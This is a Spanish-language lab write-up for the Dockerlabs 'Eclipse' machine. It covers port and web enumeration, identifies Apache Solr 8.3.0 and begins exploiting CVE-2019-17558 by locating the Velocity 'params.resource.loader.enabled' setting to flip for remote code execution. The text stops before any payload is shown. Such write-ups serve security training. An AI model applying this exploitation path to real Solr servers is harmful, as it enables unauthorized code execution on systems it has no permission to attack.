
# Writeup Template: Maquina `[ Eclipse ]`

- Tags: #Eclipse #Solr #Forence #dosbox
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Eclipse](https://mega.nz/file/RG0whSrR#dhO_VHaG-BK8A6NcVwiAhYWxZiStdYj9yT3DFWGiVEQ) Laboratorio enfocado en análisis forense y técnicas de ocultación de malware.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x eclipse.zip
sudo bash auto_deploy.sh eclipse.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80,8983 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp   open  http    Apache httpd 2.4.59 ((DebianSid))
8983/tcp open  http    Apache Solr
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], Title[Epic Battle]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta rutas.

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 837]
```

## Enumeracion Servicio Web Secundiario
#### Apache Solr
- **Motor de búsqueda empresarial**: Plataforma open-source basada en Apache Lucene para búsquedas avanzadas (texto completo, facetas, geolocalización).
- **Usos comunes**:
    - Búsquedas en sitios web/e-commerce (ej: catálogos de productos).
    - Análisis de grandes volúmenes de datos (logs, documentos).
    - Sistemas de recomendación.
- **Interfaz web**: El panel `Solr Admin` (`http://172.17.0.2:8983/solr/`) permite gestionar índices, configuraciones y consultas.
```bash
http://172.17.0.2:8983/solr/#/
```

Realizando enumeracion de rutas:
```bash
gobuster dir -u http://172.17.0.2:8983/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

Rutas encontradas:
```bash
/v2/                  (Status: 200) [Size: 161]
/api/                 (Status: 200) [Size: 161]
/solr/                (Status: 200) [Size: 15290]
```

Realizamos enumeracion de archivos:
```bash
gobuster dir -u http://172.17.0.2:8983/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que revisamos el panel del servicio expuesto por el puerto **8983**, Podemos ver la version:
```bash
- solr-spec
    8.3.0
- solr-impl
    8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:15:22
- lucene-spec
    8.3.0
- lucene-impl
    8.3.0 2aa586909b911e66e1d8863aa89f173d69f86cd2 - ishan - 2019-10-25 23:10:03
```

Sabiendo que obtener la version es critico ya que podemos encontrar posibles explioits o vulnerabilidades para ese servicio:

|**CVE**|**Riesgo**|**Impacto**|
|---|---|---|
|**CVE-2021-27905**|Inyección de módulos maliciosos (SSRF/RCE)|Ejecución remota de código vía `Config API`.|
|**CVE-2019-0193**|Deserialización insegura|RCE mediante `DataImportHandler` (CVSS 8.5).|
|**CVE-2017-12629**|XXE (XML External Entity)|Lectura de archivos internos (`/etc/passwd`).|
|**CVE-2019-17558**|RCE vía plantillas Velocity|Ejecución de comandos sin autenticación (versiones < 8.3.1).|
Ahora tambiend nos permite enumerar rutas internas que la misma web muestra:
```bash
Args
-DSTOP.KEY=solrrocks
-DSTOP.PORT=7983
-Djetty.home=/opt/solr/server
-Djetty.port=8983
-Dsolr.data.home=
-Dsolr.default.confdir=/opt/solr/server/solr/configsets/_default/conf
-Dsolr.install.dir=/opt/solr
-Dsolr.jetty.https.port=8983
-Dsolr.log.dir=/opt/solr/server/logs
-Dsolr.log.muteconsole
-Dsolr.solr.home=/opt/solr/server/solr
-Duser.timezone=UTC
-XX:+AlwaysPreTouch
-XX:+ParallelRefProcEnabled
-XX:+PerfDisableSharedMem
-XX:+UseG1GC
-XX:+UseLargePages
-XX:MaxGCPauseMillis=250
-XX:OnOutOfMemoryError=/opt/solr/bin/oom_solr.sh 8983 /opt/solr/server/logs
-Xlog:gc*:file=/opt/solr/server/logs/solr_gc.log:time,uptime:filecount=9,filesize=20M
-Xms512m
-Xmx512m
-Xss256k
```

Lo que aremos es buscar un exploit en firefox basado en su numero de vulnerabilidad:
```bash
CVE-2019-17558  exploit
```

##### Descripcion:
Un atacante podría atacar una instancia vulnerable de Apache Solr identificando primero una lista de nombres de núcleos de Solr. Una vez identificados los nombres de núcleos, un atacante puede enviar una solicitud HTTP POST especialmente diseñada a la API de configuración para cambiar el valor del cargador de recursos params del escritor de respuestas de Velocity en el archivo solrconfig.xml a verdadero. Habilitar este parámetro permitiría a un atacante usar el parámetro de plantilla de Velocity en una solicitud de Solr especialmente diseñada, lo que provocaría una RCE.

Nuestro objetivo como atacante es vulnerar esta ruta:
```bash
http://172.17.0.2:8983/solr/demo/config

# Respuesta del servidor
## HTTP ERROR 404
Problem accessing /solr/demo/config. Reason:
    Not Found
```

Ahora en **codeAdmin** tenemos un nucleo configurado:
```bash
http://172.17.0.2:8983/solr/#/~cores/**0xDojo**

0xDojo # Nucleo
```

Ahora en el panel administrativo tenemos una opcion: **coreSelector** que es nuestro objetivo, Tenemos que dejar seleccionado el nucleo **0xDojo**
Una ves seleccionado el nucleo tendremos nuevas opciones:
```bash
- [Overview](http://172.17.0.2:8983/solr/#/0xDojo/core-overview)
- [Analysis](http://172.17.0.2:8983/solr/#/0xDojo/analysis)
- [Dataimport](http://172.17.0.2:8983/solr/#/0xDojo/dataimport)
- [Documents](http://172.17.0.2:8983/solr/#/0xDojo/documents)
- [Files](http://172.17.0.2:8983/solr/#/0xDojo/files)
- Ping
- [Plugins / Stats](http://172.17.0.2:8983/solr/#/0xDojo/plugins)
- [Query](http://172.17.0.2:8983/solr/#/0xDojo/query)
- [Replication](http://172.17.0.2:8983/solr/#/0xDojo/replication)
- [Schema](http://172.17.0.2:8983/solr/#/0xDojo/schema)
- [Segments info](http://172.17.0.2:8983/solr/#/0xDojo/segments)
```

Ahora si ya podemos apuntar a la siguiente ruta:
```bash
172.17.0.2:8983/solr/0xDojo/config
```

Y el servidor nos respondera con un datos en **json**
```json
{
  "responseHeader":{
    "status":0,
    "QTime":10},
  "config":{
    "luceneMatchVersion":"org.apache.lucene.util.Version:8.3.0",
    "updateHandler":{
      "indexWriter":{"closeWaitsForMerges":true},
      "commitWithin":{"softCommit":true},
      "autoCommit":{
        "maxDocs":-1,
        "maxTime":15000,
        "openSearcher":false},
      "autoSoftCommit":{
        "maxDocs":-1,
        "maxTime":-1}},
    "query":{
      "useFilterForSortedQuery":false,
      "queryResultWindowSize":20,
      "queryResultMaxDocsCached":200,
      "enableLazyFieldLoading":true,
      "maxBooleanClauses":1024,
      "filterCache":{
        "autowarmCount":"0",
        "size":"512",
        "initialSize":"512",
        "class":"solr.FastLRUCache",
        "name":"filterCache"},
      "queryResultCache":{
        "autowarmCount":"0",
        "size":"512",
        "initialSize":"512",
        "class":"solr.LRUCache",
        "name":"queryResultCache"},
      "documentCache":{
        "autowarmCount":"0",
        "size":"512",
        "initialSize":"512",
        "class":"solr.LRUCache",
        "name":"documentCache"},
      "":{
        "size":"10000",
        "showItems":"-1",
        "initialSize":"10",
        "name":"fieldValueCache"}},
    "requestHandler":{
      "/select":{
        "name":"/select",
        "class":"solr.SearchHandler",
        "defaults":{
          "echoParams":"explicit",
          "rows":10}},
      "/query":{
        "name":"/query",
        "class":"solr.SearchHandler",
        "defaults":{
          "echoParams":"explicit",
          "wt":"json",
          "indent":"true"}},
      "/browse":{
        "name":"/browse",
        "class":"solr.SearchHandler",
        "useParams":"query,facets,velocity,browse",
        "defaults":{"echoParams":"explicit"}},
      "/update/extract":{
        "startup":"lazy",
        "name":"/update/extract",
        "class":"solr.extraction.ExtractingRequestHandler",
        "defaults":{
          "lowernames":"true",
          "fmap.content":"_text_"}},
      "/spell":{
        "startup":"lazy",
        "name":"/spell",
        "class":"solr.SearchHandler",
        "defaults":{
          "spellcheck.dictionary":"default",
          "spellcheck":"on",
          "spellcheck.extendedResults":"true",
          "spellcheck.count":"10",
          "spellcheck.alternativeTermCount":"5",
          "spellcheck.maxResultsForSuggest":"5",
          "spellcheck.collate":"true",
          "spellcheck.collateExtendedResults":"true",
          "spellcheck.maxCollationTries":"10",
          "spellcheck.maxCollations":"5"},
        "last-components":["spellcheck"]},
      "/tvrh":{
        "startup":"lazy",
        "name":"/tvrh",
        "class":"solr.SearchHandler",
        "defaults":{"tv":true},
        "last-components":["tvComponent"]},
      "/terms":{
        "startup":"lazy",
        "name":"/terms",
        "class":"solr.SearchHandler",
        "defaults":{
          "terms":true,
          "distrib":false},
        "components":["terms"]},
      "/elevate":{
        "startup":"lazy",
        "name":"/elevate",
        "class":"solr.SearchHandler",
        "defaults":{"echoParams":"explicit"},
        "last-components":["elevator"]},
      "/update":{
        "useParams":"_UPDATE",
        "class":"solr.UpdateRequestHandler",
        "name":"/update"},
      "/update/json":{
        "useParams":"_UPDATE_JSON",
        "class":"solr.UpdateRequestHandler",
        "invariants":{"update.contentType":"application/json"},
        "name":"/update/json"},
      "/update/csv":{
        "useParams":"_UPDATE_CSV",
        "class":"solr.UpdateRequestHandler",
        "invariants":{"update.contentType":"application/csv"},
        "name":"/update/csv"},
      "/update/json/docs":{
        "useParams":"_UPDATE_JSON_DOCS",
        "class":"solr.UpdateRequestHandler",
        "invariants":{
          "update.contentType":"application/json",
          "json.command":"false"},
        "name":"/update/json/docs"},
      "update":{
        "class":"solr.UpdateRequestHandlerApi",
        "useParams":"_UPDATE_JSON_DOCS",
        "name":"update"},
      "/config":{
        "useParams":"_CONFIG",
        "class":"solr.SolrConfigHandler",
        "name":"/config"},
      "/schema":{
        "class":"solr.SchemaHandler",
        "useParams":"_SCHEMA",
        "name":"/schema"},
      "/replication":{
        "class":"solr.ReplicationHandler",
        "useParams":"_REPLICATION",
        "name":"/replication"},
      "/get":{
        "class":"solr.RealTimeGetHandler",
        "useParams":"_GET",
        "defaults":{
          "omitHeader":true,
          "wt":"json",
          "indent":true},
        "name":"/get"},
      "/admin/ping":{
        "class":"solr.PingRequestHandler",
        "useParams":"_ADMIN_PING",
        "invariants":{
          "echoParams":"all",
          "q":"{!lucene}*:*"},
        "name":"/admin/ping"},
      "/admin/segments":{
        "class":"solr.SegmentsInfoRequestHandler",
        "useParams":"_ADMIN_SEGMENTS",
        "name":"/admin/segments"},
      "/admin/luke":{
        "class":"solr.LukeRequestHandler",
        "useParams":"_ADMIN_LUKE",
        "name":"/admin/luke"},
      "/admin/system":{
        "class":"solr.SystemInfoHandler",
        "useParams":"_ADMIN_SYSTEM",
        "name":"/admin/system"},
      "/admin/mbeans":{
        "class":"solr.SolrInfoMBeanHandler",
        "useParams":"_ADMIN_MBEANS",
        "name":"/admin/mbeans"},
      "/admin/plugins":{
        "class":"solr.PluginInfoHandler",
        "name":"/admin/plugins"},
      "/admin/threads":{
        "class":"solr.ThreadDumpHandler",
        "useParams":"_ADMIN_THREADS",
        "name":"/admin/threads"},
      "/admin/properties":{
        "class":"solr.PropertiesRequestHandler",
        "useParams":"_ADMIN_PROPERTIES",
        "name":"/admin/properties"},
      "/admin/logging":{
        "class":"solr.LoggingHandler",
        "useParams":"_ADMIN_LOGGING",
        "name":"/admin/logging"},
      "/admin/health":{
        "class":"solr.HealthCheckHandler",
        "useParams":"_ADMIN_HEALTH",
        "name":"/admin/health"},
      "/admin/file":{
        "class":"solr.ShowFileRequestHandler",
        "useParams":"_ADMIN_FILE",
        "name":"/admin/file"},
      "/export":{
        "class":"solr.ExportHandler",
        "useParams":"_EXPORT",
        "components":["query"],
        "defaults":{"wt":"json"},
        "invariants":{
          "rq":"{!xport}",
          "distrib":false},
        "name":"/export"},
      "/graph":{
        "class":"solr.GraphHandler",
        "useParams":"_ADMIN_GRAPH",
        "invariants":{
          "wt":"graphml",
          "distrib":false},
        "name":"/graph"},
      "/stream":{
        "class":"solr.StreamHandler",
        "useParams":"_STREAM",
        "defaults":{"wt":"json"},
        "invariants":{"distrib":false},
        "name":"/stream"},
      "/sql":{
        "class":"solr.SQLHandler",
        "useParams":"_SQL",
        "defaults":{"wt":"json"},
        "invariants":{"distrib":false},
        "name":"/sql"},
      "/analysis/document":{
        "class":"solr.DocumentAnalysisRequestHandler",
        "startup":"lazy",
        "useParams":"_ANALYSIS_DOCUMENT",
        "name":"/analysis/document"},
      "/analysis/field":{
        "class":"solr.FieldAnalysisRequestHandler",
        "startup":"lazy",
        "useParams":"_ANALYSIS_FIELD",
        "name":"/analysis/field"},
      "/debug/dump":{
        "class":"solr.DumpRequestHandler",
        "useParams":"_DEBUG_DUMP",
        "defaults":{
          "echoParams":"explicit",
          "echoHandler":true},
        "name":"/debug/dump"}},
    "queryResponseWriter":{
      "json":{
        "name":"json",
        "class":"solr.JSONResponseWriter",
        "content-type":"text/plain; charset=UTF-8"},
      "velocity":{
        "startup":"lazy",
        "name":"velocity",
        "class":"solr.VelocityResponseWriter",
        "template.base.dir":"",
        "solr.resource.loader.enabled":"true",
        "params.resource.loader.enabled":"false"},
      "xslt":{
        "name":"xslt",
        "class":"solr.XSLTResponseWriter",
        "xsltCacheLifetimeSeconds":5}},
    "searchComponent":{
      "spellcheck":{
        "name":"spellcheck",
        "class":"solr.SpellCheckComponent",
        "queryAnalyzerFieldType":"text_general",
        "spellchecker":{
          "name":"default",
          "field":"_text_",
          "classname":"solr.DirectSolrSpellChecker",
          "distanceMeasure":"internal",
          "accuracy":0.5,
          "maxEdits":2,
          "minPrefix":1,
          "maxInspections":5,
          "minQueryLength":4,
          "maxQueryFrequency":0.01}},
      "tvComponent":{
        "name":"tvComponent",
        "class":"solr.TermVectorComponent"},
      "terms":{
        "name":"terms",
        "class":"solr.TermsComponent"},
      "elevator":{
        "name":"elevator",
        "class":"solr.QueryElevationComponent",
        "queryFieldType":"string"}},
    "updateProcessor":{
      "uuid":{
        "name":"uuid",
        "class":"solr.UUIDUpdateProcessorFactory"},
      "remove-blank":{
        "name":"remove-blank",
        "class":"solr.RemoveBlankFieldUpdateProcessorFactory"},
      "field-name-mutating":{
        "name":"field-name-mutating",
        "class":"solr.FieldNameMutatingUpdateProcessorFactory",
        "pattern":"[^\\w-\\.]",
        "replacement":"_"},
      "parse-boolean":{
        "name":"parse-boolean",
        "class":"solr.ParseBooleanFieldUpdateProcessorFactory"},
      "parse-long":{
        "name":"parse-long",
        "class":"solr.ParseLongFieldUpdateProcessorFactory"},
      "parse-double":{
        "name":"parse-double",
        "class":"solr.ParseDoubleFieldUpdateProcessorFactory"},
      "parse-date":{
        "name":"parse-date",
        "class":"solr.ParseDateFieldUpdateProcessorFactory"},
      "add-schema-fields":{
        "name":"add-schema-fields",
        "class":"solr.AddSchemaFieldsUpdateProcessorFactory"}},
    "initParams":[{
        "path":"/update/**,/query,/select,/tvrh,/elevate,/spell,/browse",
        "defaults":{"df":"_text_"}}],
    "listener":[{
        "event":"newSearcher",
        "class":"solr.QuerySenderListener",
        "queries":[]},
      {
        "event":"firstSearcher",
        "class":"solr.QuerySenderListener",
        "queries":[]}],
    "directoryFactory":{
      "name":"DirectoryFactory",
      "class":"solr.NRTCachingDirectoryFactory"},
    "codecFactory":{"class":"solr.SchemaCodecFactory"},
    "updateRequestProcessorChain":[{
        "default":"true",
        "name":"add-unknown-fields-to-the-schema",
        "processor":"uuid,remove-blank,field-name-mutating,parse-boolean,parse-long,parse-double,parse-date,add-schema-fields",
        "":[{"class":"solr.LogUpdateProcessorFactory"},
          {"class":"solr.DistributedUpdateProcessorFactory"},
          {"class":"solr.RunUpdateProcessorFactory"}]}],
    "updateHandlerupdateLog":{
      "dir":"",
      "numVersionBuckets":65536},
    "requestDispatcher":{
      "handleSelect":false,
      "httpCaching":{
        "never304":true,
        "etagSeed":"Solr",
        "lastModFrom":"opentime",
        "cacheControl":null},
      "requestParsers":{
        "multipartUploadLimitKB":2147483647,
        "formUploadLimitKB":2147483647,
        "addHttpRequestToContext":false}},
    "indexConfig":{
      "useCompoundFile":false,
      "maxBufferedDocs":-1,
      "ramBufferSizeMB":100.0,
      "ramPerThreadHardLimitMB":-1,
      "writeLockTimeout":-1,
      "lockType":"native",
      "infoStreamEnabled":false,
      "metrics":{}},
    "peerSync":{"useRangeVersions":true}}}
```

Ahora esto lo interceptaremos con **burpsuite** para poder alterar las peticiones que se esta realizado
Lanzamos **burpsuite**
```bash
burpsuite &>/dev/null & disown
```

Ahora que ya estamos en modo **Intercept** y el **foxyProxy** configurado para que pase la peticion por **bupsuite**
Procedemos a interceptar esta peticion
```bash
http://172.17.0.2:8983/solr/0xDojo/config
```

Ahora mandamos al modo **repeater** esta peticon con **ctrl + r**
```bash
GET /solr/0xDojo/config HTTP/1.1
Host: 172.17.0.2:8983
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Ahora vemos que esta realizando la peticion por el metodo **GET** a la siguiente ruta, Ya sabemos que con **GET** los datos viajan atraves de la **URL**
```bash
GET /solr/0xDojo/config HTTP/1.1
```

Si reenviamos la peticion, Tenemos el mismo resutaldo queveiamos desde la web:
```bash
HTTP/1.1 200 OK
Content-Type: text/plain;charset=utf-8
Content-Length: 11729

{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "config":{
    "luceneMatchVersion":"org.apache.lucene.util.Version:8.3.0",
    "updateHandler":{
      "indexWriter":{"closeWaitsForMerges":true},
      "commitWithin":{"softCommit":true},
      "autoCommit":{
        "maxDocs":-1,
        "maxTime":15000,
        "openSearcher":false},
      "autoSoftCommit":{
        "maxDocs":-1,
        "maxTime":-1}},
    "query":{
      "useFilterForSortedQuery":false,
      "queryResultWindowSize":20,
      "queryResultMaxDocsCached":200,
      "enableLazyFieldLoading":true,
      "maxBooleanClauses":1024,
      "filterCache":{
        "autowarmCount":"0",
        "size":"512",
        "initialSize":"512",
        "class":"solr.FastLRUCache",
        "name":"filterCache"},
      "queryResultCache":{
        "autowarmCount":"0",
        "size":"512",
        "initialSize":"512",
        "class":"solr.LRUCache",
        "name":"queryResultCache"},
      "documentCache":{
        "autowarmCount":"0",
        "size":"512",
        "initialSize":"512",
        "class":"solr.LRUCache",
        "name":"documentCache"},
      "":{
        "size":"10000",
        "showItems":"-1",
        "initialSize":"10",
        "name":"fieldValueCache"}},
    "requestHandler":{
      "/select":{
        "name":"/select",
        "class":"solr.SearchHandler",
        "defaults":{
          "echoParams":"explicit",
          "rows":10}},
      "/query":{
        "name":"/query",
        "class":"solr.SearchHandler",
        "defaults":{
          "echoParams":"explicit",
          "wt":"json",
          "indent":"true"}},
      "/browse":{
        "name":"/browse",
        "class":"solr.SearchHandler",
        "useParams":"query,facets,velocity,browse",
        "defaults":{"echoParams":"explicit"}},
      "/update/extract":{
        "startup":"lazy",
        "name":"/update/extract",
        "class":"solr.extraction.ExtractingRequestHandler",
        "defaults":{
          "lowernames":"true",
          "fmap.content":"_text_"}},
      "/spell":{
        "startup":"lazy",
        "name":"/spell",
        "class":"solr.SearchHandler",
        "defaults":{
          "spellcheck.dictionary":"default",
          "spellcheck":"on",
          "spellcheck.extendedResults":"true",
          "spellcheck.count":"10",
          "spellcheck.alternativeTermCount":"5",
          "spellcheck.maxResultsForSuggest":"5",
          "spellcheck.collate":"true",
          "spellcheck.collateExtendedResults":"true",
          "spellcheck.maxCollationTries":"10",
          "spellcheck.maxCollations":"5"},
        "last-components":["spellcheck"]},
      "/tvrh":{
        "startup":"lazy",
        "name":"/tvrh",
        "class":"solr.SearchHandler",
        "defaults":{"tv":true},
        "last-components":["tvComponent"]},
      "/terms":{
        "startup":"lazy",
        "name":"/terms",
        "class":"solr.SearchHandler",
        "defaults":{
          "terms":true,
          "distrib":false},
        "components":["terms"]},
      "/elevate":{
        "startup":"lazy",
        "name":"/elevate",
        "class":"solr.SearchHandler",
        "defaults":{"echoParams":"explicit"},
        "last-components":["elevator"]},
      "/update":{
        "useParams":"_UPDATE",
        "class":"solr.UpdateRequestHandler",
        "name":"/update"},
      "/update/json":{
        "useParams":"_UPDATE_JSON",
        "class":"solr.UpdateRequestHandler",
        "invariants":{"update.contentType":"application/json"},
        "name":"/update/json"},
      "/update/csv":{
        "useParams":"_UPDATE_CSV",
        "class":"solr.UpdateRequestHandler",
        "invariants":{"update.contentType":"application/csv"},
        "name":"/update/csv"},
      "/update/json/docs":{
        "useParams":"_UPDATE_JSON_DOCS",
        "class":"solr.UpdateRequestHandler",
        "invariants":{
          "update.contentType":"application/json",
          "json.command":"false"},
        "name":"/update/json/docs"},
      "update":{
        "class":"solr.UpdateRequestHandlerApi",
        "useParams":"_UPDATE_JSON_DOCS",
        "name":"update"},
      "/config":{
        "useParams":"_CONFIG",
        "class":"solr.SolrConfigHandler",
        "name":"/config"},
      "/schema":{
        "class":"solr.SchemaHandler",
        "useParams":"_SCHEMA",
        "name":"/schema"},
      "/replication":{
        "class":"solr.ReplicationHandler",
        "useParams":"_REPLICATION",
        "name":"/replication"},
      "/get":{
        "class":"solr.RealTimeGetHandler",
        "useParams":"_GET",
        "defaults":{
          "omitHeader":true,
          "wt":"json",
          "indent":true},
        "name":"/get"},
      "/admin/ping":{
        "class":"solr.PingRequestHandler",
        "useParams":"_ADMIN_PING",
        "invariants":{
          "echoParams":"all",
          "q":"{!lucene}*:*"},
        "name":"/admin/ping"},
      "/admin/segments":{
        "class":"solr.SegmentsInfoRequestHandler",
        "useParams":"_ADMIN_SEGMENTS",
        "name":"/admin/segments"},
      "/admin/luke":{
        "class":"solr.LukeRequestHandler",
        "useParams":"_ADMIN_LUKE",
        "name":"/admin/luke"},
      "/admin/system":{
        "class":"solr.SystemInfoHandler",
        "useParams":"_ADMIN_SYSTEM",
        "name":"/admin/system"},
      "/admin/mbeans":{
        "class":"solr.SolrInfoMBeanHandler",
        "useParams":"_ADMIN_MBEANS",
        "name":"/admin/mbeans"},
      "/admin/plugins":{
        "class":"solr.PluginInfoHandler",
        "name":"/admin/plugins"},
      "/admin/threads":{
        "class":"solr.ThreadDumpHandler",
        "useParams":"_ADMIN_THREADS",
        "name":"/admin/threads"},
      "/admin/properties":{
        "class":"solr.PropertiesRequestHandler",
        "useParams":"_ADMIN_PROPERTIES",
        "name":"/admin/properties"},
      "/admin/logging":{
        "class":"solr.LoggingHandler",
        "useParams":"_ADMIN_LOGGING",
        "name":"/admin/logging"},
      "/admin/health":{
        "class":"solr.HealthCheckHandler",
        "useParams":"_ADMIN_HEALTH",
        "name":"/admin/health"},
      "/admin/file":{
        "class":"solr.ShowFileRequestHandler",
        "useParams":"_ADMIN_FILE",
        "name":"/admin/file"},
      "/export":{
        "class":"solr.ExportHandler",
        "useParams":"_EXPORT",
        "components":["query"],
        "defaults":{"wt":"json"},
        "invariants":{
          "rq":"{!xport}",
          "distrib":false},
        "name":"/export"},
      "/graph":{
        "class":"solr.GraphHandler",
        "useParams":"_ADMIN_GRAPH",
        "invariants":{
          "wt":"graphml",
          "distrib":false},
        "name":"/graph"},
      "/stream":{
        "class":"solr.StreamHandler",
        "useParams":"_STREAM",
        "defaults":{"wt":"json"},
        "invariants":{"distrib":false},
        "name":"/stream"},
      "/sql":{
        "class":"solr.SQLHandler",
        "useParams":"_SQL",
        "defaults":{"wt":"json"},
        "invariants":{"distrib":false},
        "name":"/sql"},
      "/analysis/document":{
        "class":"solr.DocumentAnalysisRequestHandler",
        "startup":"lazy",
        "useParams":"_ANALYSIS_DOCUMENT",
        "name":"/analysis/document"},
      "/analysis/field":{
        "class":"solr.FieldAnalysisRequestHandler",
        "startup":"lazy",
        "useParams":"_ANALYSIS_FIELD",
        "name":"/analysis/field"},
      "/debug/dump":{
        "class":"solr.DumpRequestHandler",
        "useParams":"_DEBUG_DUMP",
        "defaults":{
          "echoParams":"explicit",
          "echoHandler":true},
        "name":"/debug/dump"}},
    "queryResponseWriter":{
      "json":{
        "name":"json",
        "class":"solr.JSONResponseWriter",
        "content-type":"text/plain; charset=UTF-8"},
      "velocity":{
        "startup":"lazy",
        "name":"velocity",
        "class":"solr.VelocityResponseWriter",
        "template.base.dir":"",
        "solr.resource.loader.enabled":"true",
        "params.resource.loader.enabled":"false"},
      "xslt":{
        "name":"xslt",
        "class":"solr.XSLTResponseWriter",
        "xsltCacheLifetimeSeconds":5}},
    "searchComponent":{
      "spellcheck":{
        "name":"spellcheck",
        "class":"solr.SpellCheckComponent",
        "queryAnalyzerFieldType":"text_general",
        "spellchecker":{
          "name":"default",
          "field":"_text_",
          "classname":"solr.DirectSolrSpellChecker",
          "distanceMeasure":"internal",
          "accuracy":0.5,
          "maxEdits":2,
          "minPrefix":1,
          "maxInspections":5,
          "minQueryLength":4,
          "maxQueryFrequency":0.01}},
      "tvComponent":{
        "name":"tvComponent",
        "class":"solr.TermVectorComponent"},
      "terms":{
        "name":"terms",
        "class":"solr.TermsComponent"},
      "elevator":{
        "name":"elevator",
        "class":"solr.QueryElevationComponent",
        "queryFieldType":"string"}},
    "updateProcessor":{
      "uuid":{
        "name":"uuid",
        "class":"solr.UUIDUpdateProcessorFactory"},
      "remove-blank":{
        "name":"remove-blank",
        "class":"solr.RemoveBlankFieldUpdateProcessorFactory"},
      "field-name-mutating":{
        "name":"field-name-mutating",
        "class":"solr.FieldNameMutatingUpdateProcessorFactory",
        "pattern":"[^\\w-\\.]",
        "replacement":"_"},
      "parse-boolean":{
        "name":"parse-boolean",
        "class":"solr.ParseBooleanFieldUpdateProcessorFactory"},
      "parse-long":{
        "name":"parse-long",
        "class":"solr.ParseLongFieldUpdateProcessorFactory"},
      "parse-double":{
        "name":"parse-double",
        "class":"solr.ParseDoubleFieldUpdateProcessorFactory"},
      "parse-date":{
        "name":"parse-date",
        "class":"solr.ParseDateFieldUpdateProcessorFactory"},
      "add-schema-fields":{
        "name":"add-schema-fields",
        "class":"solr.AddSchemaFieldsUpdateProcessorFactory"}},
    "initParams":[{
        "path":"/update/**,/query,/select,/tvrh,/elevate,/spell,/browse",
        "defaults":{"df":"_text_"}}],
    "listener":[{
        "event":"newSearcher",
        "class":"solr.QuerySenderListener",
        "queries":[]},
      {
        "event":"firstSearcher",
        "class":"solr.QuerySenderListener",
        "queries":[]}],
    "directoryFactory":{
      "name":"DirectoryFactory",
      "class":"solr.NRTCachingDirectoryFactory"},
    "codecFactory":{"class":"solr.SchemaCodecFactory"},
    "updateRequestProcessorChain":[{
        "default":"true",
        "name":"add-unknown-fields-to-the-schema",
        "processor":"uuid,remove-blank,field-name-mutating,parse-boolean,parse-long,parse-double,parse-date,add-schema-fields",
        "":[{"class":"solr.LogUpdateProcessorFactory"},
          {"class":"solr.DistributedUpdateProcessorFactory"},
          {"class":"solr.RunUpdateProcessorFactory"}]}],
    "updateHandlerupdateLog":{
      "dir":"",
      "numVersionBuckets":65536},
    "requestDispatcher":{
      "handleSelect":false,
      "httpCaching":{
        "never304":true,
        "etagSeed":"Solr",
        "lastModFrom":"opentime",
        "cacheControl":null},
      "requestParsers":{
        "multipartUploadLimitKB":2147483647,
        "formUploadLimitKB":2147483647,
        "addHttpRequestToContext":false}},
    "indexConfig":{
      "useCompoundFile":false,
      "maxBufferedDocs":-1,
      "ramBufferSizeMB":100.0,
      "ramPerThreadHardLimitMB":-1,
      "writeLockTimeout":-1,
      "lockType":"native",
      "infoStreamEnabled":false,
      "metrics":{}},
    "peerSync":{"useRangeVersions":true}}}
```

De todos los parametros nuestro objetivo es alterar este para que puedamos derivarlo a un **RCE**:
```bash
"params.resource.loader.enabled":"false"},
```
### Ejecucion del Ataque
Antes de reenviar la peticion manipularemos el valor asociado a ese parametro seteandolo a **TRUE** el cargador de recursos de la plantilla **velocity**
De primeras esta asi:
```json
"velocity":{
        "startup":"lazy",
        "name":"velocity",
        "class":"solr.VelocityResponseWriter",
        "template.base.dir":"",
        "solr.resource.loader.enabled":"true",
        "params.resource.loader.enabled":"false"},
```

